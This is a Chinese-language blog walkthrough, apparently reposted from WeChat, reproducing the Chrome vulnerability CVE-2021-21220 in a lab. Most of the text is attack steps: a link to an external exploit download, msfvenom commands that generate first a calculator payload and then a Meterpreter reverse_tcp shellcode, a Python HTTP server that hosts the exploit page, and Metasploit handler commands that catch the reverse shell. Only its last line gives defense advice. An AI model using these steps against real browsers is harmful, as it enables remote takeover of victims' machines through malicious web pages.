# Web安全之复现CVE-2021-21220漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzIwMzU0NDY5OA==&mid=2247489462&idx=1&sn=c9bf3c353a7b2eec91f3b9b6a7e0e277&chksm=96cc96a3a1bb1fb5975d4d05d62eda57d4c3b66e9eaeef1201038c1fc7f00f4e41102258aeba&scene=126&sessionid=1681669454#rd](http://mp.weixin.qq.com/s?__biz=MzIwMzU0NDY5OA==&mid=2247489462&idx=1&sn=c9bf3c353a7b2eec91f3b9b6a7e0e277&chksm=96cc96a3a1bb1fb5975d4d05d62eda57d4c3b66e9eaeef1201038c1fc7f00f4e41102258aeba&scene=126&sessionid=1681669454#rd)

![](../Images/228cf130555151e6251c651d8236f769.png)

今天小编来复现一下cve-2021-21220这个chrome浏览器的高危级别的漏洞，这个漏洞的影响非常大，如果你的chrome的版本<= 89.0.4389.128，那么很容易就会受到利用这个漏洞精心准备的钓鱼网站攻击。

靶机环境：win10 ,chrome浏览器（x64）83版本（使用无沙箱打开\--no-sandbox）

攻击机：kali2021版

Exp获取地址：https://share.weiyun.com/EXlNm02A

 

我们在kali命令行上输入：msfvenom -a x64 -p windows/x64/exec CMD="calc" EXITFUNC=thread -f num，输出如下：

![](../Images/551a03b6c39e80c481cc3b2d83a9f3fb.png)

   

将输出的代码与exp文件中的代码替换：

 

![](../Images/121aa4e336bcf47d8fb8fec47220fce8.png)

  

然后在此界面起一个http服务让靶机访问：python3 -m http.server 8888

![](../Images/4f5f9175017adcb2fa02c2fe636e7299.png)

   

点击poc.html文件：

![](../Images/1ecfd5439cfc2c42a83757b590a5a832.png)

   

弹出计算器：

![](../Images/43ab9c42236ee53566060df8000aa081.png)

   

 

验证这个漏洞存在，接下来输入：

msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=（攻击机地址） LPORT=4444 -f num

生成代码后替换上面的poc.html的shellcode代码，保存稳exp.html，然后开启监听：

在msf命令行下：

use exploit/multi/handler

set LHOST 192.168.210.47（攻击机地址）

set payload windows/x64/meterpreter/reverse\_tcp

Run

![](../Images/8937cd7f2482660bfe30456b983af662.png)

   

使用靶机去点击exp.html，反弹shell成功

![](../Images/b1eac1905fa432ad47d741aa1e5d138e.png)

   

漏洞防御：升级chrome浏览器到最新版本，不要乱点一些奇奇怪怪的网站，防止被渗透！
